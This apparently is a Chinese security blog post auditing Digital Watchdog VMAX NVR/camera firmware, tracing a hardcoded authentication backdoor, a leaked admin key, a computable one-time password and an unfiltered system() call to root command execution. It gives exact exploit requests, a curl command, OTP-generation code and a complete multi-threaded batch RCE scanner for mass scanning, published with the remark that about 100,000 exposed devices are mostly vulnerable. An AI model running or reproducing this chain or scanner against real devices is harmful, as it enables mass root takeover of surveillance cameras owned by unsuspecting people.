#  【审计】Digital Watchdog VMAX IP Plus 摄像头命令执行漏洞  
原创 泼猴
                    泼猴  表哥带我   2026-05-07 19:22  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/UA4ABKCY6OwXBSVFGxQBJcu23KaAkVeuHicAt8pqJxibhP4OCJKwrrTpZd0qAIdDJj4SoQWooibtjibLyN4AuCqibyMCDSJpISdS8b1nxkXfNha0/640?wx_fmt=gif&from=appmsg "")  
  
**表哥已经很久没有更新文章了，今天看见有人在直播日一个山寨排行榜，然后日偏了，目标变成了真排行榜的多个蜜罐。**  
  
**排行榜运营（山海）非常感谢这位朋友长达两小时的友情测试，同时从运营方传来决定，悬赏2000元，开放白帽攻坚！对排行榜主站“ www.h-acker.cn ”页面的成功篡改/任意文件上传均有效。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OybLEoHvviaNdbkK0XecTPHNyymzyxia9UA8a1WddFQaCOKQ9E99lfPTRdkdmP41SKNrFFlSnkxialURfXQdvkviaFxcz2jNpRwPrI/640?wx_fmt=png&from=appmsg "")  
  
**闲来无事，边看直播边码一下库存的审计过程和思路，大家可以一起学习 这个设备的漏洞全网大概10w个目标吧，存在漏洞的占大多数，不过完全没有影响到国内的资产，所以比较适合发出来。**  
  
**目标概况**  
  
设备: Digital Watchdog NVR/DVR (DW VMAX A1 Plus 系列)  
  
芯片: 海思 Hi3536 (ARMv7l)  
  
内核: Linux 3.18.20 / 3.10.0_hi3536  
  
Web Server: lighttpd/1.4.54  
  
CGI 框架: 自研 libcgi.so + libcgi_common.so (uClibc 动态链接)  
  
认证: 自研 session 机制 (CGISID cookie + 共享内存)  
  
首先看到 libcgi_common.so  
 的 check_login_param  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OzOMOGIpicvTj46a19s9TzBBibRNUcBzRqQVia2zicibRprE9fy94L7pdmWo8Of0efg2yHJDQhcN6Ijy6iaQZia0nKsKJXI6xhiaRcWoOA/640?wx_fmt=png&from=appmsg "")  
```
int __fastcall check_login_param(int a1, int a2)  {  char s[256];  memset(s, 0, sizeof(s));  s1 = (char *)cgi_param("_f_auth");  if ( s1 )  {  if ( !strcmp(s1, "__jake924__") ) // ← 硬编码后门  return sub_3310(a1, -1, 0); // ← 注册 admin session  return 0;  }  } 
```  
  
再看sub_3310函数 (session 注册):  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OyjdkA3AMazog81SWr5p6kZGLvErzaS0vzAia3mQHgyOGYMe0BEe3XOoYHUlSGKFCGkkSp2nAsmYMK7snLdicObuCBYTLJyf2IDs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OwjLGDibL8JibQXgcuQjdElwItTD01nbicwfcwZq4WF8SVdIU6G4vmSwT0GaJAuu6urrUMhGIS62dEF3MqocibBxRWgsg7wkpSLlmA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/UA4ABKCY6OxPECYweXcd1KLmFdSLuEYV5fxODNZg5U3rT8BIRM69icLp7JqxIRXLib6Tyu5f0dicUd6XbHE1NVibXArhjXunx7DEibfHaVfbvYho/640?wx_fmt=png&from=appmsg "")  
  
libcgi_common.so  
 的 check_login_param()  
 函数中存在硬编码后门。当 CGI 参数 _f_auth  
 等于 jake924  
时，直接跳过认证，注册管理员 session。  
  
受影响 CGI (导入了 check_login_param):  
  
/cgi-bin/setup.cgi  
  
/cgi-bin/getParam.cgi  
  
/cgi-bin/update_save.cgi  
  
/cgi-bin/live_monitoring.cgi  
  
/cgi-bin/vod_playback.cgi  
  
**请求包**  
```
GET /cgi-bin/setup.cgi?_f_auth=__jake924__ HTTP/1.1  
```  
  
验证后门生效: 无后门时响应 143B (重定向/空页面)，有后门时响应 17276B (完整管理页面)。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OzCCZkgiaHhICf5BPwZib5e261kCqicrrz1LTJLFDjJIlEkYX5gBiatYevOCcSibgRXJIbRdkJIOrOn02ibT2fT90GiaibepWxG4GiajOho/640?wx_fmt=png&from=appmsg "")  
  
获取 Admin Console KEY  
  
**原理**  
: admin_console.cgi 页面在 HTML 源码中以 readonly input 明文显示 KEY 值。  
  
**请求**  
 (携带 Step 1 的 session cookie):  
```
GET /cgi-bin/admin_console.cgi HTTP/1.1  Host:  Cookie: CGISID=flnT1F2oJiXAER6xohFspAGQPErefP7uatea17qBpmd5c  
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6Oy23u0GvJweTQp2XTibSzgpwyqKA0Tz1Dt15EqqRkvp3z0lIwUicTLcsQDYibOTT2wicfURFBhp8JyibMSF0VZMjLxs1wq92nJgv8ib8/640?wx_fmt=png&from=appmsg "")  
  
**响应关键行**  
:  
```
<input id="key" type="text" style="width: 200px" value="117CD709-D8654A1A" readonly/>
```  
  
**提取 KEY**  
: 117CD709-D8654A1A  
  
KEY 来源: 存储在 /tmp/_admin_console.key  
 文件中，由设备首次启动时随机生成，格式为 XXXXXXXX-XXXXXXXX (十六进制)  
。  
  
获取设备日期  
  
**原理**  
: OTP 以设备当前日期为种子之一。需要读取设备时间而非攻击机时间。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6OxiaW4210dMoqxu3ofyl3ibQ3oqcjIrWIe7GVsCSibnicoXGo43g6y6IhW4W8icBCUOAYHVD9pyUiaqWDZEtiayW7yCyU8SOnD0icCkERI/640?wx_fmt=png&from=appmsg "")  
  
**请求**  
:  
```
GET /cgi-bin/setup_system_information.cgi HTTP/1.1  Host: <target>  Cookie: CGISID=flnT1F2oJiXAER6xohFspAGQPErefP7uatea17qBpmd5c  **响应**:var cur_year = "2026";  var cur_month = "3"; // JavaScript 0-based: 0=Jan, 3=Apr  var cur_day = "16";  var cur_hour = "0";  var cur_min = "33";  
```  
  
日期转换: JavaScript month  
 是 0-based  
, 需要 +1  
:  
  
cur_month=3  
 → 实际月份 = 4 (April)  
  
格式化: 04/16/2026  
  
计算 OTP  
  
算法逆向 (IDA  
 反编译 admin_console_core.cgi sub_10990  
):  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6Ox4UrbLbYsZpcI8LicgDjtDAmGuRqp42jUsKdCQMkzTgZlDHhadlclS9uTiaz6iagHFIZy5Pd0CicZcL33ia9MpKC2fKfKzvOfBzgNE/640?wx_fmt=png&from=appmsg "")  
```
int sub_10990()  {  int v0; // r0  int v1; // r0  int v2; // r0  const char *v3; // r6  int v4; // r0  bool v5; // zf  const char *v6; // r5  const char *v7; // r1  FILE *v8; // r0  FILE *v9; // r4  __time_t tv_sec; // r7  int v11; // r0  size_t v12; // r0  const char *v13; // r1  int v14; // r2  int v15; // r0  int v16; // r12  char *v17; // r3  unsigned int v18; // lr  _BOOL4 v19; // lr  const char *v20; // r0  const char *v21; // r0  const char *v22; // r4  size_t v23; // r0  FILE *v24; // r0  FILE *v25; // r4  int v26; // r0  time_t timer; // [sp+Ch] [bp-248h] BYREF  __int64 v29; // [sp+10h] [bp-244h] BYREF  _DWORD v30[4]; // [sp+1Ch] [bp-238h] BYREF  char v31[32]; // [sp+2Ch] [bp-228h] BYREF  struct tm tp; // [sp+4Ch] [bp-208h] BYREF  char s[64]; // [sp+78h] [bp-1DCh] BYREF  char s2[4]; // [sp+B8h] [bp-19Ch] BYREF  _BYTE v35[60]; // [sp+BCh] [bp-198h] BYREF  double v36[9]; // [sp+F8h] [bp-15Ch] BYREF  int v37; // [sp+140h] [bp-114h]  int v38; // [sp+144h] [bp-110h]  int v39; // [sp+148h] [bp-10Ch]  int v40; // [sp+14Ch] [bp-108h]  struct timeval tv; // [sp+150h] [bp-104h] BYREF  v0 = cgi_init();  v1 = cgi_session_start(v0);  v2 = cgi_process_form(v1);  cgi_init_headers(v2);  load_setup(&unk_22198);  v3 = (const char *)cgi_param("key");  v4 = cgi_param("pwd");  v5 = v4 == 0;  if ( v4 )  v5 = v3 == 0;  v6 = (const char *)v4;  if ( v5 )  goto LABEL_5;  memset(s, 0, sizeof(s));  v8 = (FILE *)fopen64("/tmp/_admin_console.key", "rb");  v9 = v8;  if ( v8 )  {  fread(s, 1u, 0x40u, v8);  fclose(v9);  }  if ( strcmp(s, v3) )  {  v7 = "<font color='red'>key is not matched!</font>";  goto LABEL_31;  }  *(_DWORD *)s2 = 0;  memset(v35, 0, sizeof(v35));  gettimeofday(&tv, 0);  tv_sec = tv.tv_sec;  v11 = sub_11900(tv.tv_usec, 1000);  timer = sub_11B40(1000 * tv_sec + v11, (unsigned __int64)(1000LL * tv_sec + v11) >> 32, 1000, 0);  localtime_r(&timer, &tp);  snprintf(v31, 0x20u, "%02d/%02d/%04d", tp.tm_mon + 1, tp.tm_mday, tp.tm_year + 1900);  snprintf((char *)&tv, 0x100u, "$$_NVR ONETIME PWD IS '%s' AND '%s' AND JAKE 700924_$$", v31, v3);  memset(v30, 0, sizeof(v30));  v12 = strlen((const char *)&tv);  v37 = 271733878;  v36[0] = 0.0;  v38 = -1732584194;  v39 = -271733879;  v40 = 1732584193;  sub_10EC8(v36, &tv, v12);  v13 = (const char *)&unk_11DBD;  *(_QWORD *)&v29 = vshld_n_s64(*(__int64 *)&v36[0], 3u);  while ( 1 )  {  sub_10EC8(v36, v13, 1);  if ( (LOBYTE(v36[0]) & 0x3F) == 0x38 )  break;  v13 = "";  }  sub_10EC8(v36, (__int64 *)&v29, 8);  v14 = 0;  v15 = 0;  v16 = 0;  v30[0] = v40;  v30[1] = v39;  v30[2] = v38;  v30[3] = v37;  v17 = s2;  do{  v15 += 8;  v16 = *((unsigned __int8 *)v30 + v14) + (v16 << 8);  do{  do{  v18 = (unsigned int)(v16 << 6) >> v15;  v15 -= 6;  *v17++ = aAbcdefghijklmn[v18 & 0x3F];  }  while ( v15 > 6 );  v19 = v15 > 0;  if ( v14 != 7 )  v19 = 0;  }  while ( v19 );  ++v14;  }  while ( v14 != 8 );  while ( ((unsigned __int8)v17 & 3) != 0 )  *v17++ = 61;  *v17 = 0;  if ( strcmp(v6, s2) )  {  LABEL_5:  v7 = "<font color='red'>no permit</font>";  LABEL_31:  strcpy(&dest, v7);  goto LABEL_32;  }  v20 = (const char *)cgi_param("category");  dest = 0;  if ( !strcmp(v20, "system_cmd") )  {  v21 = (const char *)cgi_param("cmd");  v22 = v21;  if ( v21 )  {  if ( *v21 )  {  v23 = strlen(v21);  if ( v22[v23] == 13 )  v22[v23] = 0;  unlink("/tmp/_admin_console");  setenv("LD_LIBRARY_PATH", "$LD_LIBRARY_PATH:/edvr2/lib:/main/lib", 1);  setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/bin", 1);  snprintf(command, 0x40000u, "%s &> /tmp/_admin_console", v22);  system(command);  v24 = (FILE *)fopen64("/tmp/_admin_console", "rb");  v25 = v24;  if ( !v24 )  {  v7 = "<font color=red>no output</font>";  goto LABEL_31;  }  fread(&dest, 1u, 0x40000u, v24);  fclose(v25);  }  }  }  LABEL_32:  v26 = ajax_check_output(&dest, 0);  cgi_end(v26);  return 0;  }  
```  
  
发现 OTP 只用 MD5 摘要的前 8 字节做 Base64 编码 (循环边界 v14 == 7)，不是完整 16 字节。  
  
Python 实现:  
```
import hashlib, base64  KEY = "117CD709-D8654A1A"  DATE = "04/16/2026" # MM/DD/YYYY, 从设备读取  seed = f"$$_NVR ONETIME PWD IS '{DATE}' AND '{KEY}' AND JAKE 700924_$$"  md5_digest = hashlib.md5(seed.encode()).digest()  otp = base64.b64encode(md5_digest[:8]).decode() # 只取前8字节!  print(f"OTP: {otp}")  # 输出: OTP: U7EtabS2H/E=  
```  
  
**执行命令**  
  
原理: admin_console_core.cgi 的 system_cmd分支将 cmd参数零过滤直接拼入system() 调用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UA4ABKCY6Owyl4TLxDydHeaHofktuceHV3IdUyHQ9UcMIicyCHSic8vs15iaicJNPWJXc1jUXXxcrI5JS7MHAIUpKyUfPibia2iaHZSsRfxblm0A3E/640?wx_fmt=png&from=appmsg "")  
  
**IDA 反编译**  
:  
```
v20 = (const char *)cgi_param("category");  dest = 0;  if ( !strcmp(v20, "system_cmd") )  {  v21 = (const char *)cgi_param("cmd");  v22 = v21;  if ( v21 )  {  if ( *v21 )  {  v23 = strlen(v21);  if ( v22[v23] == 13 )  v22[v23] = 0;  unlink("/tmp/_admin_console");  setenv("LD_LIBRARY_PATH", "$LD_LIBRARY_PATH:/edvr2/lib:/main/lib", 1);  setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/bin", 1);  snprintf(command, 0x40000u, "%s &> /tmp/_admin_console", v22);  system(command);  v24 = (FILE *)fopen64("/tmp/_admin_console", "rb");  v25 = v24;  if ( !v24 )  {  v7 = "<font color=red>no output</font>";  goto LABEL_31;  }  fread(&dest, 1u, 0x40000u, v24);  fclose(v25);  }  }  }  
```  
  
**请求**  
:  
```
GET /cgi-bin/admin_console_core.cgi?key=117CD709-D8654A1A&pwd=U7EtabS2H/E=&category=system_cmd&cmd=id HTTP/1.1  Host: <target>  curl -k "http://<target>/cgi-bin/admin_console_core.cgi?key=117CD709-D8654A1A&pwd=U7EtabS2H%2FE%3D&category=system_cmd&cmd=id"  
```  
  
**响应**  
:  
```
uid=0(root) gid=0(root)  
```  
  
**漏洞利用链**  
  
攻击者  
  
│  
  
│ GET /cgi-bin/setup.cgi?_f_auth=**jake924**  
  
▼  
  
[VULN-01] check_login_param() 后门  
  
│ strcmp(user_input, "**jake924**  
") == 0  
  
│ → sub_3310(a1, -1, 0)  
  
│ → cgi_session_register_var("logon", "0") // admin  
  
│ ← Set-Cookie: CGISID=xxx  
  
▼  
  
攻击者 (持有 admin session)  
  
│  
  
│ GET /cgi-bin/admin_console.cgi  
  
▼  
  
[VULN-02] KEY 明文泄露  
  
│  
  
│ ← KEY = "117CD709-D8654A1A"  
  
▼  
  
攻击者 (持有 KEY)  
  
│  
  
│ GET /cgi-bin/setup_system_information.cgi  
  
│ ← cur_month="3" cur_day="16" cur_year="2026"  
  
│ → date = "04/16/2026" (JS month 0-based, +1)  
  
▼  
  
[VULN-03] OTP 离线计算  
  
│ seed = "$$NVR ONETIME PWD IS '04/16/2026' AND '117CD709-D8654A1A' AND JAKE 700924  
$$"  
  
│ OTP = Base64( MD5(seed)[0:8] )  
  
│ → OTP = "U7EtabS2H/E="  
  
▼  
  
攻击者 (持有 KEY + OTP)  
  
│  
  
│ GET /cgi-bin/admin_console_core.cgi  
  
│ ?key=117CD709-D8654A1A  
  
│ &pwd=U7EtabS2H/E=  
  
│ &category=system_cmd  
  
│ &cmd=id  
  
▼  
  
[VULN-04] system() RCE  
  
│ cgi_param("cmd") → v22  
  
│ snprintf(command, 0x40000, "%s &> /tmp/_admin_console", v22)  
  
│ system(command) // 零过滤, 直接执行  
  
│ fopen("/tmp/_admin_console") → fread → 返回输出  
  
│  
  
▼  
  
uid=0(root) gid=0(root)  
  
**一键利用脚本**  
```
#!/usr/bin/env python3  import sys  import os  import re  import hashlib  import base64  import socket  import argparse  import csv  import threading  import concurrent.futures  from datetime import datetime  socket.setdefaulttimeout(15)  try:  import requests  import urllib3  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  except ImportError:  print("[!] pip install requests")  sys.exit(1)  BACKDOOR_PARAM = "_f_auth"BACKDOOR_VALUE = "__jake924__"OTP_SALT = "$$_NVR ONETIME PWD IS '%s' AND '%s' AND JAKE 700924_$$"BACKDOOR_CGIS = [  "/cgi-bin/setup.cgi",  "/cgi-bin/getParam.cgi",  "/cgi-bin/update_save.cgi",  "/cgi-bin/live_monitoring.cgi",  "/cgi-bin/vod_playback.cgi",  ]  CSV_FIELDS = ["target", "status", "server", "key", "date", "otp", "rce_output", "timestamp"]  csv_lock = threading.Lock()  def s(timeout=10):  sess = requests.Session()  sess.verify = False  sess.headers["User-Agent"] = "Mozilla/5.0 (compatible)"return sess  def g(sess, url, timeout=10, **kw):  try:  return sess.get(url, timeout=timeout, **kw)  except:  return None  def is_dw(target, timeout=8):  sess = s()  r = g(sess, f"{target}/cgi-bin/login.cgi", timeout, allow_redirects=True)  if r is None:  r = g(sess, f"{target}/", timeout)  if r is None:  return False, ""server = r.headers.get("Server", "")  body = r.text.lower()  hit = any(k in body for k in ["digital-watchdog", "vmax", "login_proc.cgi",  "cgi-bin_mobile", "redirect_mobile_check",  "rsa_pub_key"]) or "fwebserver"in server.lower()  return hit, server  def try_rce(target, timeout=10):  for cgi in BACKDOOR_CGIS:  sess = s()  r = g(sess, f"{target}{cgi}", timeout, allow_redirects=False,  params={BACKDOOR_PARAM: BACKDOOR_VALUE})  if r is None:  continuekey = None  r2 = g(sess, f"{target}/cgi-bin/admin_console.cgi", timeout)  if r2:  m = re.search(r'id="key"[^>]*value="([^"]*)"', r2.text)  if m:  key = m.group(1)  date_str = datetime.now().strftime("%m/%d/%Y")  r3 = g(sess, f"{target}/cgi-bin/setup_system_information.cgi", timeout)  if r3:  mm = re.search(r'cur_months*=s*"(d+)"', r3.text)  dd = re.search(r'cur_days*=s*"(d+)"', r3.text)  yy = re.search(r'cur_years*=s*"(d+)"', r3.text)  if mm and dd and yy:  date_str = f"{int(mm.group(1))+1:02d}/{int(dd.group(1)):02d}/{yy.group(1)}"keys = []  if key:  keys.append(key)  keys.extend(["", "admin", "root", "default"])  for k in keys:  seed = OTP_SALT % (date_str, k)  otp = base64.b64encode(hashlib.md5(seed.encode()).digest()[:8]).decode()  r4 = g(sess, f"{target}/cgi-bin/admin_console_core.cgi", timeout + 5,  params={"key": k, "pwd": otp, "category": "system_cmd", "cmd": "id"})  if r4 is None:  continuebody = r4.text  if"404"in body and "Not Found"in body:  return None, None, None, None  clean = re.sub(r'</?xmp>', '', body).strip()  if"uid="in clean:  return k, date_str, otp, clean  return None, None, None, None  def scan_one(target, timeout, csv_writer, csv_file):  row = {"target": target, "status": "OFFLINE", "server": "", "key": "",  "date": "", "otp": "", "rce_output": "",  "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}  hit, server = is_dw(target, timeout)  if not hit:  if server or hit is not None:  row["status"] = "NOT_DW"row["server"] = server  flush_row(csv_writer, csv_file, row)  return row  row["server"] = server  row["status"] = "DW_CAM"key, date_str, otp, output = try_rce(target, timeout)  if output and "uid="in output:  row["status"] = "RCE"row["key"] = key or ""row["date"] = date_str or ""row["otp"] = otp or ""row["rce_output"] = output.replace("n", " ")[:300]  if row["status"] == "RCE":  flush_row(csv_writer, csv_file, row)  return row  def flush_row(writer, f, row):  with csv_lock:  writer.writerow(row)  f.flush()  def load_targets(src):  targets = []  if os.path.isfile(src):  with open(src, "r", encoding="utf-8") as f:  for line in f:  line = line.strip()  if line and not line.startswith("#"):  if not line.startswith("http"):  line = f"http://{line}"targets.append(line.rstrip("/"))  else:  for t in src.split(","):  t = t.strip()  if t:  if not t.startswith("http"):  t = f"http://{t}"targets.append(t.rstrip("/"))  return targets  def main():  print("""  DW/HiSilicon Batch RCE Scanner  ===============================""")  pa = argparse.ArgumentParser()  pa.add_argument("-t", "--targets", required=True, help="file or comma-separated IPs")  pa.add_argument("-T", "--timeout", type=int, default=10)  pa.add_argument("-w", "--workers", type=int, default=50)  pa.add_argument("-o", "--output", default="C:/tmp/dw_batch_full.csv")  a = pa.parse_args()  targets = load_targets(a.targets)  if not targets:  print("[!] No targets")  sys.exit(1)  total = len(targets)  print(f"[*] Targets: {total} Workers: {a.workers} Timeout: {a.timeout}s")  print(f"[*] Output: {a.output}")  print("=" * 70)  csv_f = open(a.output, "w", newline="", encoding="utf-8")  writer = csv.DictWriter(csv_f, fieldnames=CSV_FIELDS)  writer.writeheader()  csv_f.flush()  stats = {"rce": 0, "dw": 0, "offline": 0, "not_dw": 0}  def worker(t):  return scan_one(t, a.timeout, writer, csv_f)  try:  with concurrent.futures.ThreadPoolExecutor(max_workers=a.workers) as pool:  futs = {pool.submit(worker, t): t for t in targets}  for i, fut in enumerate(concurrent.futures.as_completed(futs), 1):  try:  r = fut.result(timeout=a.timeout * 8)  except Exception:  r = {"target": futs[fut], "status": "ERROR"}  st = r.get("status", "")  if st == "RCE":  stats["rce"] += 1  out = r.get("rce_output", "")[:80]  print(f"[{i}/{total}] [!!!] RCE {r['target']} KEY={r.get('key','')} {out}")  elif st == "DW_CAM":  stats["dw"] += 1  if i % 200 == 0 or i == total:  print(f"[{i}/{total}] scanning... RCE={stats['rce']} DW={stats['dw']}")  elif st == "OFFLINE":  stats["offline"] += 1  else:  stats["not_dw"] += 1  finally:  csv_f.close()  print("n" + "=" * 70)  print(f"""[*] DONE  Total: {total}  RCE: {stats['rce']}  DW Cam: {stats['dw']}  Offline: {stats['offline']}  Not DW: {stats['not_dw']}  Output: {a.output}""")  if stats["rce"] > 0:  print(f"n[!!!] {stats['rce']} confirmed RCE (uid=root):")  with open(a.output, "r", encoding="utf-8") as f:  for row in csv.DictReader(f):  if row["status"] == "RCE":  print(f" {row['target']} KEY={row['key']} {row['rce_output'][:60]}")  if __name__ == "__main__":  main()
```  
  
往期推荐  
  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491318&idx=1&sn=db5107b173df383ee43b2f1850da4a25&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491318&idx=1&sn=db5107b173df383ee43b2f1850da4a25&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491318&idx=1&sn=db5107b173df383ee43b2f1850da4a25&scene=21#wechat_redirect)  
  
[【吃瓜】秒挖高危洞的手机黑客临幸补天6群](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486810&idx=1&sn=93f5ef59db2f2957c00aa2a2551a60a4&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491219&idx=1&sn=bd95377f970cc940d4a4a7d5fa391a49&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491219&idx=1&sn=bd95377f970cc940d4a4a7d5fa391a49&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491219&idx=1&sn=bd95377f970cc940d4a4a7d5fa391a49&scene=21#wechat_redirect)  
  
[计算机和给狗剪毛哪个更有就业前景](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247487438&idx=1&sn=fe02467cedc8d06140340addc41274c5&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491178&idx=1&sn=7afc0c5d45dcd9b1902d1e2c685f2dea&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491178&idx=1&sn=7afc0c5d45dcd9b1902d1e2c685f2dea&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491178&idx=1&sn=7afc0c5d45dcd9b1902d1e2c685f2dea&scene=21#wechat_redirect)  
  
[【吃瓜】跳蛋级0day~抓任意网站数据包](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247486605&idx=1&sn=32d9200c5781fcd26a3ab95ceaf05b17&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491168&idx=1&sn=a0f8e643b67f1dc879b9c4d3adbc85a0&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491168&idx=1&sn=a0f8e643b67f1dc879b9c4d3adbc85a0&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491168&idx=1&sn=a0f8e643b67f1dc879b9c4d3adbc85a0&scene=21#wechat_redirect)  
  
[【吃瓜】日薪80的网络安全工程师](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247487077&idx=3&sn=5ea6009414b4c661571ed74f4f7507f5&scene=21#wechat_redirect)  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491127&idx=1&sn=6e297c23bf014488296c0418d96a2597&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491127&idx=1&sn=6e297c23bf014488296c0418d96a2597&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247491127&idx=1&sn=6e297c23bf014488296c0418d96a2597&scene=21#wechat_redirect)  
  
[【吃瓜】当小学生黑客遇上同病中人](https://mp.weixin.qq.com/s?__biz=Mzg4NDg2NTM3NQ==&mid=2247487373&idx=1&sn=d9b6d64c8644d00c4e3f41f5bb67ff38&scene=21#wechat_redirect)  
  
  
  
文稿 | 泼猴  
  
制作 | 泼猴  
  
审发 | 表哥带我  
  
